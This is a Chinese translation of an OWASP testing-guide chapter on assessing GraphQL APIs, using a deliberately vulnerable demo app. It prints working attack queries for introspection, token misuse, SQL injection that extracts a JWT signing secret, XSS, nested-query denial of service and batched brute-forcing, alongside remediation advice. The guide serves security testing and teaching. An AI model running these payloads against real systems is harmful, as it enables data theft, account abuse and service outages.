# 测试GraphQL

|ID          |
|------------|
|WSTG-APIT-99|

## 概述

GraphQL在现代API中变得非常流行。它提供了简单性和嵌套对象，便于更快的开发。虽然每种技术都有优势，但也会暴露新的攻击面。本场景的目的是提供有关利用GraphQL的应用程序的一些常见错误配置和攻击向量。某些向量是GraphQL特有的（如[内省查询](#内省查询)），有些是API通用的（如[SQL注入](#sql-注入)）。

本节中的示例将基于易受攻击的GraphQL应用程序[poc-graphql](https://github.com/righettod/poc-graphql)，该应用程序在docker容器中运行，将`localhost:8080/GraphQL`映射为易受攻击的GraphQL节点。

## 测试目标

- 评估是否部署了安全且可用于生产的配置。
- 针对通用攻击验证所有输入字段。
- 确保应用了适当的访问控制。

## 如何测试

测试GraphQL节点与测试其他API技术没有太大区别。考虑以下步骤：

### 内省查询

内省查询是GraphQL让您询问支持哪些查询、哪些数据类型可用以及您需要了解更多的详细信息的方法，在接近GraphQL部署测试时。

[GraphQL网站描述内省](https://graphql.org/learn/introspection/)：

> "通常询问GraphQL架构它支持哪些查询很有用。GraphQL允许我们使用内省系统来做到这一点！"

有几种提取此信息并可视化输出的方法，如下所述。

#### 使用原生GraphQL内省

最直接的方式是发送带有以下有效载荷的HTTP请求（使用个人代理），取自[Medium](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)上的文章：

```graphql
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

结果通常非常长（因此此处已缩短），将包含GraphQL部署的整个架构。

响应：

```json
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "Query"
      },
      "mutationType": {
        "name": "Mutation"
      },
      "subscriptionType": {
        "name": "Subscription"
      },
      "types": [
        {
          "kind": "ENUM",
          "name": "__TypeKind",
          "description": "An enum describing what kind of type a given __Type is",
          "fields": null,
          "inputFields": null,
          "interfaces": null,
          "enumValues": [
            {
              "name": "SCALAR",
              "description": "Indicates this type is a scalar.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "OBJECT",
              "description": "Indicates this type is an object. `fields` and `interfaces` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "INTERFACE",
              "description": "Indicates this type is an interface. `fields` and `possibleTypes` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "UNION",
              "description": "Indicates this type is a union. `possibleTypes` is a valid field.",
              "isDeprecated": false,
              "deprecationReason": null
            }
          ],
          "possibleTypes": null
        }
      ]
    }
  }
}
```

可以使用[GraphQL Voyager](https://apis.guru/graphql-voyager/)等工具来更好地理解GraphQL端点：

![GraphQL Voyager](images/Voyager.png)\
*图12.1-1：GraphQL Voyager*

此工具创建GraphQL架构的实体关系图（ERD）表示，允许您更好地了解系统移动部件的测试。从图中提取信息，您可以查询例如Dog表。它还显示Dog具有哪些属性：

- ID
- name
- veterinary (ID)

使用此方法有一个缺点：GraphQL Voyager不显示使用GraphQL可以完成的所有操作。例如，上面图中未列出可用的mutations。更好的策略是同时使用Voyager和下面列出的方法之一。

#### 使用GraphiQL

[GraphiQL](https://github.com/graphql/graphiql)是一个基于Web的GraphQL IDE。它是GraphQL项目的一部分，主要用于调试或开发目的。最佳实践是不允许用户在生产部署上访问它。如果您正在测试暂存环境，您可能有权访问它，因此可以在使用内省查询时保存一些时间（尽管您当然也可以在GraphiQL界面中使用内省）。

GraphiQL有一个文档部分，使用架构中的数据为所使用的GraphQL实例创建文档。此文档包含数据类型、mutations，以及通常可以使用内省提取的每一条信息。

#### 使用GraphQL Playground

[GraphQL Playground](https://github.com/graphql/graphql-playground)是一个GraphQL客户端。它可用于测试不同查询，以及将GraphQL IDE分成不同的playground，并按主题或为它们分配名称分组。与GraphiQL一样，Playground可以为您创建文档，而无需手动发送内省查询和处理响应。它还有另一个优点：它不需要GraphiQL界面可用。您可以通过URL将工具指向GraphQL节点，或使用数据文件在本地使用。GraphQL Playground可用于直接测试漏洞，因此您无需使用个人代理发送HTTP请求。这意味着您可以使用此工具进行与GraphQL的简单交互和评估。对于其他更高级的有效载荷，使用个人代理。

请注意，在某些情况下，您需要在底部设置HTTP头以包含会话ID或其他认证机制。这仍然允许创建具有不同权限的多个"IDE"以验证是否存在实际的授权问题。

![Playground1](images/Playground1.png)\
*图12.1-2：GraphQL Playground高级API文档*

![Playground2](images/Playground2.png)\
*图12.1-3：GraphQL Playground API架构*

您甚至可以下载架构以在Voyager中使用。

#### 内省结论

内省是一个有用的工具，允许用户获取有关GraphQL部署的更多信息。但是，这也将允许恶意用户访问相同的信息。最佳实践是限制对内省查询的访问，因为某些工具或请求如果完全禁用此功能可能会失败。由于GraphQL通常是系统的后端API的桥梁，因此强制执行严格的访问控制更好。

### 授权

内省是寻找授权问题的第一个地方。如前所述，对内省的访问应受限制，因为它允许数据提取和数据收集。一旦测试人员可以访问架构并了解那里存在的敏感信息，他们应该发送不会被阻止的查询由于权限不足。GraphQL默认不强制权限，由应用程序执行授权实施。

在早期的示例中，内省查询的输出显示有一个名为`auth`的查询。这似乎是提取敏感信息（如API令牌、密码等）的好地方。

![Auth GraphQL查询](images/auth1.png)\
*图12.1-4：GraphQL Auth查询API*

测试授权实施因部署而异，因为每个架构都有不同的敏感信息，因此有不同的目标关注。

在这个易受攻击的示例中，每个用户（甚至未认证）都可以获取数据库中列出的每位兽医的auth令牌。这些令牌可用于执行架构允许的其他操作，如使用mutations关联或取消关联任何指定兽医的狗，即使用户请求中没有匹配的auth令牌。

这是测试人员使用他们不拥有的提取令牌来执行"兽医Benoit"的操作的示例：

```graphql
query brokenAccessControl {
  myInfo(accessToken:"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNjAzMjkxMDE2fQ.r3r0hRX_t7YLiZ2c2NronQ0eJp8fSs-sOUpLyK844ew", veterinaryId: 2){
    id, name, dogs {
      name
    }
  }
}
```

响应：

```json
{
  "data": {
    "myInfo": {
      "id": 2,
      "name": "Benoit",
      "dogs": [
        {
          "name": "Babou"
        },
        {
          "name": "Baboune"
        },
        {
          "name": "Babylon"
        },
        {
          "name": "..."
        }
      ]
    }
  }
}
```

列表中的所有狗都属于Benoit，而不是auth令牌所有者。如果未正确实施授权执行，则可以执行这种类型的操作。

### 注入

GraphQL是应用程序API层的实现，因此，它通常将请求转发到后端API或数据库。这使您能够利用任何底层漏洞，如SQL注入、命令注入、跨站脚本等。使用GraphQL只是改变了恶意有效载荷的入口点。

您可以参考OWASP测试指南中的其他场景以获取一些想法。

GraphQL也有标量，它们通常用于没有本机数据类型的自定义数据类型，如DateTime。这些类型的数据没有开箱即用的验证，使其成为测试的良好候选。

#### SQL注入

示例应用程序在查询`dogs(namePrefix: String, limit: Int = 500): [Dog!]`中容易受到设计攻击，因为参数`namePrefix`在SQL查询中连接。在SQL查询中连接用户输入是应用程序可能暴露于SQL注入的常见不良做法。

以下查询从数据库的`CONFIG`表中提取信息：

```graphql
query sqli {
  dogs(namePrefix: "ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- ", limit: 1000) {
    id
    name
  }
}
```

此查询的响应：

```json
{
  "data": {
    "dogs": [
      {
        "id": 1,
        "name": "Abi"
      },
      {
        "id": 2,
        "name": "Abime"
      },
      {
        "id": 3,
        "name": "..."
      },
      {
        "id": 50,
        "name": "$Nf!S?(.}DtV2~:Txw6:?;D!M+Z34^"
      }
    ]
  }
}
```

该查询包含签署示例应用程序中JWT的秘密，这是非常敏感的信息。

为了了解在任何特定应用程序中要寻找什么，收集有关应用程序构建方式和数据库表组织方式的信息会很有帮助。您还可以使用`sqlmap`等工具来寻找注入路径，甚至自动化从数据库提取数据。

#### 跨站脚本（XSS）

当攻击者注入可由浏览器执行的恶意代码时，会发生跨站脚本。在[XSS测试](../07-Input_Validation_Testing/README.md)章节中了解XSS测试。您可以使用[测试反射跨站脚本](../07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md)中的有效载荷测试反射XSS。

在此示例中，错误可能反映输入并可能导致XSS。

有效载荷：

```graphql
query xss  {
  myInfo(veterinaryId:"<script>alert('1')</script>" ,accessToken:"<script>alert('1')</script>") {
    id
    name
  }
}
```

响应：

```json
{
  "data": null,
  "errors": [
    {
      "message": "Validation error of type WrongType: argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int' @ 'myInfo'",
      "locations": [
        {
          "line": 2,
          "column": 10,
          "sourceName": null
        }
      ],
      "description": "argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int'",
      "validationErrorType": "WrongType",
      "queryPath": [
        "myInfo"
      ],
      "errorType": "ValidationError",
      "extensions": null,
      "path": null
    }
  ]
}
```

### 拒绝服务（DoS）查询

GraphQL公开了一个非常简单的接口，允许开发人员使用嵌套查询和嵌套对象。此功能也可用于恶意方式，通过调用类似于递归函数的深度嵌套查询，并使用CPU、内存或其他计算资源导致拒绝服务。

回顾*图12.1-1*，您可以看到可以创建循环，其中Dog对象包含Veterinary对象。可能有无限数量的嵌套对象。

这允许深度查询，有可能超载应用程序：

```graphql
query dos {
  allDogs(onlyFree: false, limit: 1000000) {
    id
    name
    veterinary {
      id
      name
      dogs {
        id
        name
        veterinary {
          id
          name
          dogs {
            id
            name
            veterinary {
              id
              name
              dogs {
                id
                name
                veterinary {
                  id
                  name
                  dogs {
                    id
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

可以实施多种安全措施来防止这些类型的查询，列在[修复](#修复)部分。滥用查询可能导致GraphQL部署的DoS问题，应包括在测试中。

### 批量攻击

GraphQL支持将多个查询批量到单个请求中。这允许用户高效地请求多个对象或对象的多个实例。但是，攻击者可以利用此功能执行批量攻击。发送多个查询看起来像以下单个请求：

```graphql
[
  {
    query: < query 0 >,
    variables: < variables for query 0 >,
  },
  {
    query: < query 1 >,
    variables: < variables for query 1 >,
  },
  {
    query: < query n >
    variables: < variables for query n >,
  }
]
```

在示例应用程序中，可以发送单个请求以使用可猜测的ID提取所有兽医名称。然后攻击者可以使用这些名称获取这些兽医的访问令牌。而不是通过多个请求（可能被Web应用程序防火墙或速率限制器（如Nginx）等网络安全措施阻止），这些请求可能会被批量处理。这意味着可能只有几个请求，这可能允许有效暴力破解而未被检测到。以下是一个示例查询：

```graphql
query {
  Veterinary(id: "1") {
    name
  }
  second:Veterinary(id: "2") {
    name
  }
  third:Veterinary(id: "3") {
    name
  }
}
```

这将为攻击者提供兽医的名称，并且，如前所示，这些名称可用于批量查询请求那些兽医的auth令牌。例如：

```graphql
query {
  auth(veterinaryName: "Julien")
  second: auth(veterinaryName:"Benoit")
}
```

批量攻击可用于绕过在站点上强制执行的许多安全措施。它也可用于枚举对象并尝试暴力破解多因素认证或其他敏感信息。

### 详细错误消息

GraphQL在运行时可能遇到意外错误。发生此类错误时，服务器可能发送暴露内部错误详情或应用程序配置或数据的错误响应。这允许恶意用户获取更多有关应用程序的信息。作为测试的一部分，应通过发送意外数据来检查错误消息，这是一个称为模糊测试的过程。应对响应进行搜索以查找可能通过此技术泄露的敏感信息。

### 暴露底层API

GraphQL是一种相对较新的技术，一些应用程序正在从旧API过渡到GraphQL。在许多情况下，GraphQL被部署为标准API，将请求（使用GraphQL语法发送）转换到底层API，以及响应。如果对底层API的请求未正确检查授权，可能导致潜在的权限提升。

例如，包含参数`id=1/delete`的请求可能被解释为`/api/users/1/delete`。这可能扩展到操作用户`user=1`所属的其他资源。请求也可能被解释为具有授予GraphQL节点的授权，而不是真正的请求者。

测试人员应尝试访问底层API方法，因为这可能允许权限提升。

## 修复

- 限制对内省查询的访问。
- 实施输入验证。
    - GraphQL没有本机方式来验证输入，但是有一个名为["graphql-constraint-directive"](https://github.com/confuser/graphql-constraint-directive)的开源项目允许将验证作为架构定义的一部分进行输入验证。
    - 仅输入验证有帮助，但它不是完整的解决方案，应采取额外措施来缓解注入攻击。
- 实施安全措施以防止滥用查询。
    - 超时：限制允许查询运行的时间。
    - 最大查询深度：限制允许查询的深度，这可能防止滥用资源的过深查询。
    - 设置最大查询复杂度：限制查询的复杂度以缓解对GraphQL资源的滥用。
    - 使用基于服务器时间的节流：限制用户可以消耗的服务器时间量。
    - 使用基于查询复杂性的节流：限制用户可以消耗的查询总复杂度。
- 发送通用错误消息：使用不泄露部署详情的通用错误消息。
- 缓解批量攻击：
    - 在代码中添加对象请求速率限制。
    - 防止敏感对象的批量处理。
    - 限制一次可以运行的查询数量。

有关缓解GraphQL弱点的更多信息，请参阅[GraphQL速查表](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)。

## 工具

- [GraphQL Playground](https://github.com/prisma-labs/graphql-playground)
- [GraphQL Voyager](https://apis.guru/graphql-voyager/)
- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [InQL（Burp扩展）](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)
- [GraphQL Raider（Burp扩展）](https://portswigger.net/bappstore/4841f0d78a554ca381c65b26d48207e6)
- [GraphQL（ZAP附加组件）](https://www.zaproxy.org/blog/2020-08-28-introducing-the-graphql-add-on-for-zap/)

## 参考资料

- [poc-graphql](https://github.com/righettod/poc-graphql)
- [GraphQL官方网站](https://graphql.org/learn/)
- [Howtographql - 安全](https://www.howtographql.com/advanced/4-security/)
- [GraphQL约束指令](https://github.com/confuser/graphql-constraint-directive)
- [客户端测试](../11-Client-side_Testing/README.md)（XSS和其他漏洞）
- [5个常见GraphQL安全漏洞](https://carvesystems.com/news/the-5-most-common-graphql-security-vulnerabilities/)
- [GraphQL常见漏洞及如何利用它们](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [GraphQL CS](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
